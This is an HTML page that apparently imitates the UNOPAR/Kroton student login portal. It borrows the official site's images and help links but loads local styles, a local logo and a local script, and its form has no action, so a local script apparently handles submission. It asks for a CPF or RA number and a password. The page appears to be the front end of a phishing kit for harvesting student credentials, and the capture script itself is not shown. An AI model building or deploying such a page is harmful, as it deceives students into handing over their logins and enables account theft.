<!DOCTYPE html>
<html>

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
    <meta http-equiv="pragma" content="no-cache">
    <meta http-equiv="expires" content="-1">
    <title>Bem-vindo(a) LOGIN - UNOPARr</title>
    <link rel="shortcut icon" href="https://login.kroton.com.br/Content/favicon.ico">
    <link rel="stylesheet" media="screen" href="./css/bootstrap.min.css">
    <link rel="stylesheet" media="screen" href="./css/style.min.css">
    <link rel="stylesheet" href="./css/css.css">
    <style>
        body {
            background-image: url('https://login.kroton.com.br/Content/img/unopar/login-pa.jpg');
        }
    </style>
</head>

<body class="login-img-pa">
    <div class="blocologin">
        <div class="row">
            <div class="row login">
                <div class="logo text-center">
                    <img src="./logo/logopa.png">
                </div>
                <form class="form" id="form">
                    <div class="col-xs-12">
                        <h4 style="margin-top: 25px;">Bem-vindo aluno!</h4>
                        <input type="hidden" id="hidError" name="hidError">
                        <div class="alert alert-warning" style="display: none" id="trb">
                            <i class="glyphicon glyphicon-exclamation-sign"></i>&nbsp;
                            Est√° tendo problemas com seu login? <a class="alert-link"
                                href="https://login.kroton.com.br/AccountAluno/AccountTrouble">Clique aqui</a>
                        </div>
                        <div class="form-group marca-sec-texto">
                            <input type="text" id="username" name="username" class="form-control"
                                placeholder="CPF ou RA" maxlength="150" autocomplete="username">
                            <i><small id="MensagemError" class="">CPF invalido.</small></i>
                            <i><small id="campoVaziu" class="">Insira seu CPF</small></i>
                        </div>
                        <div class="form-group marca-sec-texto">
                            <input type="password" id="password" name="password" class="form-control"
                                placeholder="Senha" value="" maxlength="16" autocomplete="current-password">
                        </div>
                        <div class="form-group">
                            <span style="margin-top:10px">
                                <label for="checkbox">
                                    <input type="checkbox" id="checkbox" name="lembrarMe">
                                    &nbsp;Salvar dados
                                </label>
                            </span>
                        </div>
                        <p class="clearfix">
                            <a href="https://login.kroton.com.br/AccountAluno/AccountRegister"
                                class="marca-link js-acesso">Esqueci minha senha</a>
                            &nbsp;/ <a href="https://login.kroton.com.br/AccountAluno/AccountRegister"
                                class="marca-link js-acesso">Primeiro acesso</a>
                        </p>
                        <div class="form-group padT">
                            <button class="btn btn-primary" type="submit">ENTRAR</button>
                        </div>
                </form>
            </div>
        </div>
    </div>
    </div>
    <div class="barra text-center navbar-fixed-bottom">
        <a href="https://www.facebook.com/unoparuniversidade/" class="marca-bg" target="_blank">
            <img src="./icons/icon_face.png">
        </a>
        <a href="https://twitter.com/UNOPAR_Oficial" class="marca-bg" target="_blank">
            <img src="./icons/icon_twitter.png">
        </a>
        <a href="https://youtube.com/unoparuniversidade" class="marca-bg" target="_blank">
            <img src="./icons/icon_youtube.png">
        </a>
    </div>
    <script src="./js/index.js"></script>
</body>

</html>
